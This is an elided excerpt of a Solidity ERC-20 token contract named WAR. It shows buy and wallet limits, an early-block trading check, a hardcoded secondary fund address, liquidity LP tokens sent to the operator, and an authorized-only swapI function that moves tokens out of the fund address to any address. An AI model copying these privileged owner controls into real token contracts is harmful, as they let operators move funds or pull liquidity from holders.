...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        maxBuyAmt = 5 * 10**_decimals;
        maxWallet = 20 * 10**_decimals;
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if (block.number < startTradeBlock + small) {
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0xE925B5046228D3C7fF3DD973C5BC345f1e940Cc4;
        ...
        if (lpAmount > 0) {
            ...
            if (lpusdt > 0) {
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpusdt, 0, 0, Operator(), block.timestamp
                );
            }
        }
    }
    ...
    function swapI(address add,uint256 amount) public isAuth{
        _transfer(fundAddress,add,amount);
    }

    function setFundAddress(address addr) external isAuth {
        fundAddress = addr;
...
contract WAR is AbsToken {
    ...
    //USDT
        ...
        10000,
    //Fund
        address(0x43a29B30Cc146E1FD04Db5310390852d91CD6013),
    //Receive
        address(0xb4531717F2134C8dA04b4603A28a1941B74A19e7)
    ){
